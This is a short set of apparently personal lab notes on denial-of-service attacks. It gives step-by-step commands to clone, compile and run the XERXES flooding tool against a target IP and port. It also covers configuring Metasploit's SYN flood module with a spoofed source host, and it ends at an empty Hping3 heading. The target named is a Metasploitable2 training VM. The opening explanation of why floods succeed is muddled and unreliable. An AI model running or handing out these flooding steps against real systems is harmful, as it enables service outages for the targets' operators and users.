DOS and DDOS attacks are a types of temporary attack. When an attacker floods a target system with excessive requests, it can overwhelm the system's resources, causing it to slow down or crash.

When the cache cleaning is slower than the flood this attacks happen.


# XERXES

1. open metasploitable2 vm and find open ports.
2. git clone https://github.com/XCHADXFAQ77X/XERXES.git
3. chmod 777 xerxes
4. cd XERXES
5. gcc -o xerxes xerxes.c
6. chmod 777 xerxes
7. ./xerxes <target_ip> <port>



# DDOS Synchronization Flood Attack

1. open metasploit 
2. use auxiliary/dos/tcp/synflood
3. show options
4. set RHOSTS <target_ip>
5. set RPORT <target_port>
6. set SHOST <middle_ip>
7. set interface <interface_name> (in my case wln0)
8. run





# DOS using Hping3
